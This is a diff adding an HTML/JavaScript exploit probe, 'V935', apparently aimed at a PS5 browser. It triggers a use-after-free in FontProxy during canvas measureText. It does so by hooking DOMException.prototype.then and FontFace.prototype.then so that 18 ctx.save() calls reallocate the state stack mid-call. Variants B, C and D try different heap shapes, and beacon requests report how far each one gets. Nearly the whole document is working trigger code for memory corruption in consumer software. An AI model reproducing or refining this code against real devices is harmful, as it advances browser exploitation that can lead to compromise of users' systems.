@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V935</title></head>
+<body><pre id="out">V935 - FontProxy UAF (673f4df5) via the REJECT path: loaded promise rejects with a DOMException on failing local(); promise settle does Get(exception,"then") - hook DOMException.prototype.then</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V935-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v935 - v934's width oracle came back degenerate (serif=mono=fallback=6),
+ * so real-name matching is untrustworthy. This probe takes the mirror path:
+ *
+ * THE REJECT PATH. Per ECMA-262, BOTH promise resolve and reject functions
+ * perform Get(resolutionValue, "then") synchronously on object values.
+ * FontFace.loaded REJECTS with a DOMException (NetworkError) when the
+ * local() source matches nothing - which is the SYNCHRONOUS path we KNOW
+ * happens on PS5 (every campaign face with local('ZZ_...') lands in
+ * status=error). So:
+ *   face added to document.fonts, ctx.font='10px fam', measureText ->
+ *   fontProxy() raw pointer -> metricsOfPrimaryFont triggers the face load
+ *   -> local() lookup fails synchronously -> loaded promise REJECTS with a
+ *   DOMException -> Get(exception, "then") -> OUR GETTER on
+ *   DOMException.prototype.then -> 18 saves -> state stack realloc ->
+ *   measureText continues on the freed FontProxy. UAF.
+ *
+ * No real font name needed. Returning a non-callable (undefined) from the
+ * getter makes the settlement continue as a plain rejection - no thenable
+ * job scheduled, no stray microtasks.
+ *
+ * VARIANTS:
+ *   B: failing local() + DOMException hook, heap-first (verbatim shape).
+ *   C: failing local() + DOMException hook, null-deref shape (no initial
+ *      save - state stack still inline, realloc moves the pointed-to buffer).
+ *   D: second chance for real-name candidates from v934 with the RESOLVE
+ *      path getter (FontFace.prototype.then) - in case a name DOES match
+ *      a system font and the width oracle just cannot tell.
+ *   W: width-oracle sanity block first - same glyph at 10px/30px across
+ *      generic families; if even 30px serif vs mono collide, measureText
+ *      quantizes or everything maps to one shipped font, and the name
+ *      scan via widths is structurally dead on this port.
+ *
+ * Beacon order diagnoses: F then no D -> died inside measureText after
+ * reentry = UAF. D with status=error and no F -> failure settlement is
+ * asynchronous on this build: no reentry window, report and stop.
+ */
+
+/* ENV: hook prototypes exist? */
+bk('ENV','DOMException='+typeof DOMException+' FontFace='+typeof FontFace+' TextMetrics='+typeof TextMetrics);
+
+/* W: width sanity */
+try{
+  var wc=document.createElement('canvas').getContext('2d');
+  var probe=function(sz,fam,txt){ wc.font=sz+'px '+fam; return wc.measureText(txt).width; };
+  bk('W','a@10sans='+probe(10,'sans-serif','a')+' a@30sans='+probe(30,'sans-serif','a')+
+    ' WWW@30serif='+probe(30,'serif','WWW')+' WWW@30mono='+probe(30,'monospace','WWW')+
+    ' WWW@30sans='+probe(30,'sans-serif','WWW')+' iiiii@30mono='+probe(30,'monospace','iiiii')+
+    ' iiiii@30serif='+probe(30,'serif','iiiii'));
+}catch(e){ bk('W-throw',String(e)); }
+
+function trigger(tag,fam,src,hookProto,heapFirst){
+  var face=null;
+  try{ face=new FontFace(fam,src); }catch(e){ bk(tag+'-face-err',String(e)); return false; }
+  try{ face.loaded; }catch(e){}
+  try{ document.fonts.add(face); }catch(e){ bk(tag+'-add-err',String(e)); return false; }
+  bk(tag+'-A','face added fam='+fam+' src='+src+' status='+face.status);
+
+  var ctx=null;
+  try{ ctx=document.createElement('canvas').getContext('2d'); }catch(e){ bk(tag+'-ctx-err',String(e)); return false; }
+  try{
+    if(heapFirst){ ctx.save(); ctx.lineWidth=0.5; }
+    ctx.font='10px '+fam;
+  }catch(e){ bk(tag+'-font-err',String(e)); return false; }
+
+  var getterFired=0;
+  try{
+    Object.defineProperty(hookProto,'then',{
+      configurable:true,
+      get:function(){
+        if(getterFired) return undefined;
+        getterFired=1;
+        bk(tag+'-F','GETTER FIRED via '+hookProto.constructor.name+'.prototype; 18 saves');
+        for(var j=0;j<18;j++){ try{ ctx.save(); ctx.lineWidth=1+j; }catch(e){ bk(tag+'-save-err',j+' '+String(e)); break; } }
+        bk(tag+'-G','getter done');
+        return undefined;
+      }
+    });
+  }catch(e){ bk(tag+'-def-err',String(e)); return false; }
+
+  var w=null;
+  try{ w=ctx.measureText('a'); }catch(e){ bk(tag+'-D-throw',String(e)); }
+  bk(tag+'-D','measureText returned '+(w?('(w='+w.width+')'):'null')+' getterFired='+getterFired+' status='+face.status);
+
+  if(getterFired){
+    try{ var w2=ctx.measureText('bb'); bk(tag+'-H','2nd measureText OK w='+w2.width); }
+    catch(e){ bk(tag+'-H-throw',String(e)); }
+    try{ bk(tag+'-I','font readback = '+ctx.font); }catch(e){ bk(tag+'-I-throw',String(e)); }
+  }
+  try{ delete hookProto.then; }catch(e){}
+  bk(tag+'-J','variant done');
+  return getterFired>0;
+}
+
+/* B: reject path, heap-first (only if DOMException exists) */
+var hasDE=(typeof DOMException!=='undefined');
+var b=false, c=false;
+if(hasDE){
+  b=trigger('B','NPB','local(ZZNoSuchFontV935)',DOMException.prototype,true);
+  /* C: reject path, null-deref shape */
+  c=b?false:trigger('C','NPC','local(ZZNoSuchFontV935)',DOMException.prototype,false);
+}else{
+  bk('SKIP','DOMException absent - reject-path variants skipped');
+}
+
+/* D: resolve-path second chance over v934's candidates (cap 8) */
+var NAMES=['SST','Arial','Helvetica','Times New Roman','Meiryo','Yu Gothic','Sony Sketch','Futura'];
+var d=false;
+if(!b && !c){
+  for(var i=0;i<NAMES.length && !d;i++){
+    d=trigger('D'+i,'NPD'+i,'local(\''+NAMES[i]+'\')',FontFace.prototype,true);
+  }
+}
+
+bk('DONE','sweep complete B='+b+' C='+c+' D='+d);
+</script></body></html>
